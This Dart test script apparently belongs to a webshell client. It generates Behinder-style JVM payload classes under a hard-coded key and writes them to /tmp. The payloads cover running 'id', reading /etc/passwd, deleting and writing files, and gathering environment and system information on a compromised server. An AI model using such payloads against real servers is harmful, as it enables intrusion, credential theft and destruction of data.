import 'dart:io';
import 'dart:typed_data';

import 'package:matrix/core/crypto/jvm_bytecode.dart';

void main() {
  final factory = BehinderPayloadFactory(key: '42b842fc69195c9d');
  final tmpDir = Directory('/tmp/dart_jvm_test')..createSync(recursive: true);

  final tests = <String, GeneratedPayload Function()>{
    'Ping': () => factory.buildPing(),
    'Exec': () => factory.buildExec('id'),
    'Pwd': () => factory.buildPwd(),
    'Home': () => factory.buildHome(),
    'EnvNames': () => factory.buildEnvNames(),
    'SysInfo': () => factory.buildSysInfo(),
    'Cat': () => factory.buildCat('/etc/passwd'),
    'Rm': () => factory.buildRm('/tmp/test'),
    'Write': () => factory.buildWrite('/tmp/test', 'dGVzdA=='),
    'Ls': () => factory.buildLs('/tmp'),
    'WPart': () => factory.buildWpart('/tmp/test', Uint8List.fromList([72, 101, 108, 108, 111]), 0, 4096),
    'WClose': () => factory.buildWclose('/tmp/test'),
  };

  for (final entry in tests.entries) {
    final payload = entry.value();
    final bytes = payload.classBytes;
    final ok = bytes[0] == 0xCA && bytes[1] == 0xFE;
    print('${ok ? "OK" : "FAIL"}    ${entry.key.padRight(10)} ${bytes.length} bytes');
    File('${tmpDir.path}/${payload.className}.class').writeAsBytesSync(bytes);
  }
  print('Wrote to ${tmpDir.path}/');
}
